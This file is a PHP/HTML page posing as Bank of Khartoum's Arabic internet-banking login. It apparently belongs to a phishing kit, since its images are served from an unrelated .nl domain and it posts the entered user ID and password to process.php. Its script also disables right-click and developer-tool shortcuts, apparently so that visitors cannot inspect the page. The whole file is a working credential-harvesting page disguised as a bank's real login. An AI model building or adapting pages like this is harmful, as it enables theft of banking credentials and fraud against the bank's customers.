<?php
session_start();
session_regenerate_id(true);

if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = bin2hex(random_bytes(4));
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>

        body {
            font-family: Arial, sans-serif;
            text-align: center;
            direction: rtl;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            position: relative;
        }

        .background-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        img.header-image {
            width: 100%;
            height: auto;
        }

        h1 {
            font-size: 5vw;
            font-weight: normal;
            color: #d32f2f;
            position: absolute;
            top: 11%;
            left: 2.5%;
            z-index: 1;
        }

        .container {
            width: 90%;
            height: 45vh;
            margin: 12vw auto 0 auto;
            background: rgba(255, 255, 255, 0.8);
            padding: 2vw;
            border-radius: 1vw;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
        }

        input[type="text"],
        input[type="password"] {
            width: 90%;
            height: 4vh;
            padding: 1vw;
            margin: 1.2vw 0;
            border: 0.3vw solid #333;
            border-radius: 1.5vw;
            font-size: 3.2vw;
            text-align: left;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #ccc;
        }

        label {
            display: block;
            text-align: right;
            color: #888;
            font-size: 3vw;
            margin-bottom: 5vw;
            margin-top: 1vw;
            font-weight: bold;
            margin-right: 75vw;
            direction: rtl;
            position: relative;
        }

        label[for="userID"] {
            top: 5vw;
        }

        label[for="password"] {
            top: 5vw;
            margin-right: 71vw;
        }

        .forgot-password {
            text-align: right;
            font-size: 3.5vw;
            margin-top: 1vw;
            margin-right: 4vw;
            color: #757575;
            transform: translateY(-1vw);
        }

        .forgot-password a {
            color: #757575;
            text-decoration: none;
        }

        .login-container {
            position: absolute;
            bottom: 3vh;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
        }

        input[type="submit"] {
            background: rgba(186, 33, 33, 0.5);
            color: white;
            border: none;
            padding: 3vw;
            width: 90%;
            height: 5.5vh;
            cursor: not-allowed;
            border-radius: 2vw;
            font-size: 3vw;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            pointer-events: none;
            transition: background 0.3s ease;
        }

        input[type="submit"].enabled {
            background: linear-gradient(to top, #b71c1c, #d32f2f);
            cursor: pointer;
            pointer-events: auto;
        }

        .intro-text {
            font-size: 5vw;
            color: #888;
            margin-bottom: 3vw;
            position: relative;
            top: -3%;
            left: 1%;
        }

        .line-under-text {
            display: block;
            width: 50%;
            height: 0.7vw;
            background-color: #b71c1c;
            margin: 10vw auto 0;
            margin-top: -4vw;
            position: relative;
        }

        .terms-container {
            position: absolute;
            top: 63vw;
            left: 5vw;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            cursor: pointer;
            direction: rtl;
            transition: margin-top 0.3s ease;
            flex-direction: row-reverse;
            margin-top: 3vw;
        }

        .custom-checkbox {
            width: 4vw;
            height: 4vw;
            border: 0.3vw solid #757575;
            border-radius: 1vw;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background 0.3s, border 0.3s;
            margin-right: -1vw;
        }

        .custom-checkbox.checked {
            background: #b71c1c;
            border-color: #b71c1c;
        }

        .custom-checkbox::after {
            content: "";
            font-size: 3vw;
            color: white;
            display: none;
        }

        .custom-checkbox.checked::after {
            content: "✔";
            display: block;
        }

        .terms-text {
            font-size: 3.5vw;
            color: #757575;
            font-weight: bold;
            margin-left: 2vw;
        }

        .error-message {
            font-size: 3vw;
            color: red;
            margin-top: 1vw;
            text-align: right;
            margin-right: 5vw;
            display: none;
            position: absolute;
        }

        .error-input {
            border: 0.3vw solid red !important;
        }

        #userIDError {
            top: 34vw;
            right: 55vw;
        }

        #passwordError {
            top: 56vw;
            right: 52vw;
        }

        .eye-icon {
            position: absolute;
            right: 6vw;
            top: 50%;
            transform: translateY(-50%);
            font-size: 4vw;
            cursor: pointer;
            color: #757575;
            transition: color 0.3s ease;
        }

        .eye-icon.move-left {
            right: 50vw;
        }

        .eye-icon.move-right {
            right: 5vw;
        }

        .overlay-icons {
            position: absolute;
            bottom: 2vw;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 15vw;
            z-index: 1;
        }

        .overlay-icons img {
            width: 8vw;
            height: auto;
            cursor: pointer;
            transition: transform 0.3s ease;
        }

        .overlay-icons img:hover {
            transform: scale(1.2);
        }

        /* الإضافة: الخلفية الباهتة مع علامة التحميل */
        #loadingOverlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        /* علامة التحميل الدوارة */
        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3); /* إطار فاتح */
            border-top: 8px solid #b8860b; /* أصفر غامق */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0%   { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
    </style>
</head>
<body>

<script>
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'r') || e.key === 'F5') {
            e.preventDefault();
        }
    });
</script>

<img src="https://ib-bok-sd.nl/J/logo.jpg" alt="Logo" class="background-image" />
<img src="https://ib-bok-sd.nl/S/logo.jpg" alt="Logo" class="header-image" />

<!-- أيقونات التواصل مع روابط -->
<div class="overlay-icons">
    <img src="https://ib-bok-sd.nl/33/logo.jpg" alt="Icon 1" onclick="window.location.href='https://www.facebook.com/BankofKhartoum1913?mibextid=ZbWKwL'" />
    <img src="https://ib-bok-sd.nl/22/logo.jpg" alt="Icon 2" onclick="window.location.href='https://twitter.com/bankofkhartoum?s=09'" />
    <img src="https://ib-bok-sd.nl/55/logo.jpg" alt="Icon 3" onclick="window.location.href='https://www.linkedin.com/authwall?XiS2aNCsF4XCUT0qMo9xWVro=&original'" />
    <img src="https://ib-bok-sd.nl/44/logo.jpg" alt="Icon 4" onclick="window.location.href='https://bankofkhartoum.com'" />
</div>

<h1 class="move-up move-right">Internet Banking - Login</h1>

<div class="container">
    <p class="intro-text"><strong>الرجاء ادخال التفاصيل</strong></p>
    <span class="line-under-text"></span>
    <form id="loginForm" action="process.php" method="POST" onsubmit="return handleFormSubmit(event)">
        <label for="userID">:User ID</label>
        <input
            type="text"
            id="userID"
            name="userID"
            placeholder="ادخل معرف المستخدم"
            required
            inputmode="numeric"
            pattern="\d*"
            maxlength="7"
            onfocus="handleFocus()"
            oninput="validateUserIDLength()"
            style="direction: ltr; text-align: left;"
        />
        <div id="userIDError" class="error-message"></div>

        <label for="password">:Password</label>
        <div style="position: relative;">
            <input
                type="password"
                id="password"
                name="password"
                placeholder="ادخل كلمه المرور"
                required
                onfocus="showPasswordError()"
                oninput="validatePassword()"
                style="direction: ltr; text-align: left;"
            />
            <i class="fas fa-eye-slash eye-icon" id="eye-icon" onclick="togglePasswordVisibility()"></i>
        </div>
        <div id="passwordError" class="error-message"></div>

        <div class="forgot-password">
            <a href="#">?هل نسيت كلمه السر</a>
        </div>

        <div class="terms-container" onclick="toggleCheckbox()">
            <div class="custom-checkbox" id="checkbox"></div>
            <span class="terms-text">الشروط و الاحكام</span>
        </div>

        <div class="login-container">
            <input type="submit" value="تسجيل الدخول" id="loginButton" disabled />
        </div>
    </form>
</div>

<!-- إضافة: شاشة التحميل -->
<div id="loadingOverlay">
    <div class="spinner"></div>
</div>

<script>
    let userIDValid = false;
    let passwordValid = false;
    let termsAccepted = false;

    function handleFocus() {
        document.getElementById("userID").classList.add("error-input");
        document.getElementById("userIDError").style.display = "block";
    }

    function validateUserIDLength() {
        const input = document.getElementById("userID");
        const errorDiv = document.getElementById("userIDError");
        input.value = input.value.replace(/\D/g, "");

        if (input.value.length === 7) {
            userIDValid = true;
            input.classList.remove("error-input");
            errorDiv.style.display = "none";
        } else {
            userIDValid = false;
            input.classList.add("error-input");
            errorDiv.style.display = "block";
        }
        updateLoginButtonState();
    }

    function showPasswordError() {
        document.getElementById("passwordError").style.display = "block";
        document.getElementById("password").classList.add("error-input");
    }

    function validatePassword() {
        const password = document.getElementById("password").value;
        const errorDiv = document.getElementById("passwordError");
        const field = document.getElementById("password");

        const hasLowercase = /[a-z]/.test(password);
        const hasUppercase = /[A-Z]/.test(password);
        const hasNumber = /[0-9]/.test(password);
        const hasSpecialChar = /[!@#\$%\^&\*\(\)_\+\-=\[\]\{\};':"\\|,.<>\/?]/.test(password);
        const hasMinLength = password.length >= 8;

        if (hasLowercase && hasUppercase && hasNumber && hasSpecialChar && hasMinLength) {
            passwordValid = true;
            errorDiv.style.display = "none";
            field.classList.remove("error-input");
        } else {
            passwordValid = false;
            errorDiv.style.display = "block";
            field.classList.add("error-input");
        }

        updateLoginButtonState();
    }

    function toggleCheckbox() {
        const checkbox = document.getElementById("checkbox");
        checkbox.classList.toggle("checked");

        termsAccepted = checkbox.classList.contains("checked");
        updateLoginButtonState();
    }

    function updateLoginButtonState() {
        const loginButton = document.getElementById("loginButton");

        if (userIDValid && passwordValid && termsAccepted) {
            loginButton.disabled = false;
            loginButton.classList.add("enabled");
        } else {
            loginButton.disabled = true;
            loginButton.classList.remove("enabled");
        }
    }

    function togglePasswordVisibility() {
        const passwordField = document.getElementById("password");
        const eyeIcon = document.getElementById("eye-icon");

        if (passwordField.type === "text") {
            passwordField.type = "password";
            eyeIcon.classList.replace("fa-eye", "fa-eye-slash");
        } else {
            passwordField.type = "text";
            eyeIcon.classList.replace("fa-eye-slash", "fa-eye");
        }
    }

    // الوظيفة الجديدة عند إرسال الفورم
    function handleFormSubmit(event) {
        // التأكد أن الزر مفعل (الحقول صحيحة)
        if (userIDValid && passwordValid && termsAccepted) {
            // إظهار شاشة التحميل
            document.getElementById("loadingOverlay").style.display = "flex";

            // يمكن ترك الفورم يُرسل بشكل طبيعي (لأن عند submit يتوجه للصفحة الأخرى)
            return true;
        } else {
            // يمنع الإرسال لو لم تكن الشروط متحققة (يفترض أنها مفعلة تلقائياً من قبل)
            event.preventDefault();
            return false;
        }
    }
</script>

</body>
</html>